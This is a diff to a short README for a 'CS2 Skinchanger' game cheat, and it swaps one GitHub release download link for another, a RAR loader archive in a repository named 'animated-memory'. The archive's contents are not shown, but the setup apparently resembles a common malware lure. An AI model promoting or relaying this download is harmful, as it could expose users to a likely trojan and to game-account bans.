@@ -1,5 +1,5 @@
 # CS2 Skinchanger Updated 09.04
-## [Download latest version](https://github.com/dev12389/animated-memory/releases/download/Release/CS2LOADER.rar)
+## [Download latest version](https://github.com/dev12389/animated-memory/releases/download/Release/Loader.rar)
 
 ![1](https://github.com/user-attachments/assets/a74a1195-b6fb-4bdc-a24a-5777d554b663)
 
